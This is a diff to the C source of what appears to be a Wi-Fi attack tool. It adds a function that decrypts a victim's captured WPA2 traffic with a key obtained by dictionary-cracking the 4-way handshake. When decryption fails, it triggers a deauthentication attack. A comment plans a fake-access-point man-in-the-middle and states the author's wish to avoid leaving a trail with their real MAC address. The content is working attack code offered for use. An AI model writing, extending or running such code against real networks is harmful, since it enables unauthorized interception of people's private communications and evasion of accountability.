@@ -3,6 +3,9 @@
 
 extern int debug_level;
 
+/* Predeclare */
+static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len);
+
 static int parse_llc_header(const char* buf, size_t len, 
 		uint32_t *offset, struct WPA2_handshake_packet *packet) {
 	if (*offset > len) return -1;
@@ -38,6 +41,16 @@ uint16_t construct_frame_control(uint8_t version, enum ieee80211_type type,
     return htons(frame_control);
 }
 
+
+/* XXX: As I know, We can't spoof victim to change access point mac address.
+ *      The only way is waitting when victim think the signal with access point is really bad,
+ *      and send a reassociated to find a new ap in the same ESS.
+ *      As a fake access point, we can response the reassociated request and become a middle man 
+ *      between the true access point and victim.
+ *      Sure we can connect to access point with the crack password, and send a ARP spoof to victim
+ *      However, that's not what I want to do, cause I don't want leave the trail with my real MAC
+ *      address.
+ */
 static void man_in_middle_attack(void *ctx, const u8 *src_addr, const char *buf, size_t len) {
   struct MITM *MITM = (struct MITM *)ctx;
   u32 offset;
@@ -55,8 +68,7 @@ static void man_in_middle_attack(void *ctx, const u8 *src_addr, const char *buf,
   if (WLAN_PARSE_TYPE(fc) == IEEE80211_DATA_TYPE){}
 }
 
-static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet *packet) {
-	/* XXX : How to make sure the handshake packet is the same process ? */
+static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet *packet, int cracked) {
 	/* frame 2 of 4-way handshake */
 	struct encrypto_info *info = &MITM->encry_info;
 	enum MITM_state *state = &MITM->state;
@@ -102,12 +114,12 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 			log_printf(MSG_DEBUG, "get all hankshake information, start dictionary attack.");
 			*state = MITM_state_crash_PTK;
 			/* Dictionary attack , if crash password success, reset enough. */
-			if (!dictionary_attack(MITM->dict_path, info)) {
+			if (!dictionary_attack(MITM->dict_path, info, cracked)) {
 				log_printf(MSG_INFO, "[CRASH] Crash WPA2 encryption success!"RED" SSID = %s, Password = %s"NONE, 
 						info->SSID, info->password);
 				*state = MITM_state_ready;
 				info->enough = 0;
-                l2_packet_change_callback(MITM->l2_packet, man_in_middle_attack);
+        l2_packet_change_callback(MITM->l2_packet, peek_encrypted_data);
 			} else {
 				log_printf(MSG_DEBUG, "Dictionary attack failed\n");
 				return -1;
@@ -248,7 +260,7 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 			case MITM_state_capture_handshake :
 				if (packet.llc_hdr.type == 0x888e) {
           parse_auth_data(buf, len, &offset, &packet);
-					fill_encry_info(MITM, &packet);
+					fill_encry_info(MITM, &packet, 0);
 				}
 				break;
       }
@@ -259,6 +271,57 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 	}
 	free(mac_s);
 	return;
+}
+
+static void peek_encrypted_data(void *ctx, const u8 *src_addr, const char *buf, size_t len) {
+  struct MITM *MITM = (struct MITM *)ctx;
+  uint16_t type;
+//  if (!memcmp(src_addr, MITM->encry_info.SA, ETH_ALEN) || !memcmp(src_addr, MITM->encry_info.AA, ETH_ALEN))
+//    return;
+
+  u32 offset;
+  offset = ((struct ieee80211_radiotap_header *)buf)->it_len;
+  if (offset > len) return;
+  type = WLAN_PARSE_TYPE(ntohs(*(uint16_t *)(buf + offset)));
+
+  if (type == IEEE80211_DATA_TYPE) {
+    /* If the LLC (Linked layer control) type is 802.1X Authentication(0x888e),
+     * means that the PTK will be changed after this packet.
+     * we should calculate new PTK with EAPOL frame. 
+     */
+    struct WPA2_handshake_packet packet;
+    struct ieee80211_hdr_3addr *hdr = (struct ieee80211_hdr_3addr *) (buf + offset);
+    memcpy(&packet.ieee80211_header, buf + offset, sizeof(struct ieee80211_hdr_3addr));
+    if (!((!memcmp(packet.ieee80211_header.addr1, MITM->encry_info.SA, ETH_ALEN) &&
+        !memcmp(packet.ieee80211_header.addr3, MITM->encry_info.AA, ETH_ALEN)) ||
+        (!memcmp(packet.ieee80211_header.addr1, MITM->encry_info.AA, ETH_ALEN) &&
+        !memcmp(packet.ieee80211_header.addr3, MITM->encry_info.SA, ETH_ALEN))))
+        return;
+    offset += sizeof(struct ieee80211_hdr_3addr);
+    if (packet.type == IEEE80211_QOS_DATA) offset += 2;
+    if (packet.ieee80211_header.frame_control & ntohs(WLAN_FC_PROTECTED)) {
+      /* Encryption Data */
+      size_t plain_len;
+      u8 *plain;
+      plain = ccmp_decrypt(MITM->encry_info.ptk.tk1, hdr,
+                           buf + offset, len - offset, &plain_len);
+      if (!plain) {
+        /* Can't crack data, PTK may wrong. We should start deauth attack again. */
+        log_printf(MSG_DEBUG, "Plain can't crack, start deauthentication attack to get a new PTK.");
+        eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
+      } else {
+        lamont_hdump(MSG_DEBUG, "Decryption plain", plain, plain_len);
+      }
+    } else {
+      /* Non-Encryption Data */
+      parse_llc_header(buf, len, &offset, &packet);
+      if (packet.llc_hdr.type == 0x888e) {
+        /* EAPOL Frame */
+        parse_auth_data(buf, len, &offset, &packet);
+        fill_encry_info(MITM, &packet, 1);
+      }
+    }
+  }
 }
 
 static int construct_deauth_pkt(u8 *buffer, size_t *pkt_len, u8 *victim, u8 *ap, u16 seq_num) {
